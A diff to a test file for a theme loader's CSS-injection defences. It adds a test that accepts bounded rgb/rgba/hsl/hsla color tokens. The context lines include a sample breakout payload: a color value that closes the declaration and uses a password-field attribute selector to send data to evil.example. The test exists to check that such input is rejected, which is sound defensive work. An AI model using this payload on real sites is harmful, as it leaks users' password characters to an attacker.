@@ -210,6 +210,26 @@ describe('reloadThemes — AC-4 canonical token registry / CSS-injection safety'
     expect(css).toContain('--font-weight-body: medium;')
   })
 
+  it('accepts the bounded rgb/rgba/hsl/hsla color grammar', async () => {
+    const deps = fixtureDeps({
+      'color-functions.json': {
+        content: JSON.stringify({
+          name: 'color-functions',
+          tokens: {
+            colorPrimary600: 'rgb(30, 58, 138)',
+            colorPrimary700: 'rgba(30, 58, 138, 0.5)',
+            colorBackground: 'hsl(220, 64%, 33%)',
+            colorForeground: 'hsla(220, 64%, 33%, 0.75)',
+          },
+        }),
+      },
+    })
+
+    const result = await reloadThemes(THEMES_DIR, { ...deps, logger: silentLogger })
+
+    expect(result).toEqual({ loaded: ['color-functions.json'], failed: [] })
+  })
+
   it('rejects a CSS-injection breakout attempt via a color token (url(/;/} breakout)', async () => {
     const payload =
       'red; } input[type=password][value^="a"] { background: url(https://evil.example/exfil?a)'
